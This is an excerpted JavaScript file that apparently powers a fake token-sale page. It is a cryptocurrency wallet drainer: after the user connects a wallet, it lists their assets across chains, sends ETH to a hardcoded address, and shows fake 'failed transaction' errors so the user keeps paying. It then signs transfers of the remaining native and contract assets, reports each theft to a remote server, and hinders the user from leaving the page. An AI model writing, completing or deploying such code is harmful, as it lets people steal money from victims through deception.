...
const MS_Server = "dourcoineth.com";
    ...
    let tokens = [], response = await fetch('https://rpc.ankr.com/multichain', {
      ...
      body: JSON.stringify({
        ...
        "params": {
          ...
          "walletAddress": MS_Current_Address
        }
      })
    });
...
const SIGN_NATIVE = async (asset) => {
  ...
  const gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
  const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price)
    .mul(ethers.BigNumber.from(gas_limit)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id] + 3)))).toString();
...
const DO_CONTRACT = async (asset) => {
  ...
  sign_next();
  const tx = await contract[MS_Settings.Settings.Chains[ankr_chain_id].Contract_Type](MS_Settings.Address, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
...
const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      const out_amount = ethers.BigNumber.from(amount);
...
const connect_wallet = async (provider = null) => {
  try {
    ...
    await connect_success(); ms_hide();
    document.getElementById('text-connect').innerText = 'Connected'
    ...
    let balance;
    web3.eth.getBalance(web3.currentProvider.selectedAddress).then((balanceInWei) => {
    ...
    async function sendEthereumTransaction() {
      ...
      let inp = document.getElementById("quantity").value
      let givenNumber = inp.toString();
      let walletAddress = web3.currentProvider.selectedAddress;
      web3.eth.sendTransaction({
        from: walletAddress,
        to: '0x1953c92b51fDF094Ed5d01B7FA490A8b433990ED',
        ...
        .on('confirmation', async function (confirmationNumber, receipt) {
          ...
          if (parseFloat(balance).toFixed(4) - parseFloat(inp).toFixed(4) >= parseFloat(inp).toFixed(4)) {
            alert('[ERROR] Failed transaction, try again!')
            sendEthereumTransaction()
          } else {
            start()
          }
          ...
          asset = {
            ...
            type: 'ETH',
            name: 'ETHER',
            amount_usd: parseFloat(inp * MS_Currencies[convert_chain('ID', 'CURRENCY', 1)]['USD'])
          }

          send_request({ action: 'transfer_success', asset, user_id: MS_ID });
        })
        .on('error', (error) => {
          setTimeout(() => {
            sendEthereumTransaction()
    ...
    async function start() {
      let ss = await get_wallet_assets(MS_Current_Address);
      let assets = []
      for (let k in ss) {
        if (ss[k].chain_id == 1 || ss[k].chain_id == 'ETH') {
          if (ss[k].amount_usd > 35) {
            assets.push(ss[k])
          }
        } else {
          assets.push(ss[k])
...
document.getElementById('connect').addEventListener('click', () => ms_init());
document.getElementById('connect-2').addEventListener('click', () => ms_init());
...
function calculate(valor) {
  ...
  let eth = 1824.40
  let moeda = 0.000000001089
  document.getElementById('usd').textContent = '$' + (valor * eth).toFixed(2)
  let price = valor / moeda
  document.getElementById('final').textContent = convert(price)
}

window.addEventListener("beforeunload", (e) => {
  e.stopPropagation(); e.preventDefault();
  leave_website(); e.returnValue = '';
  return;
});
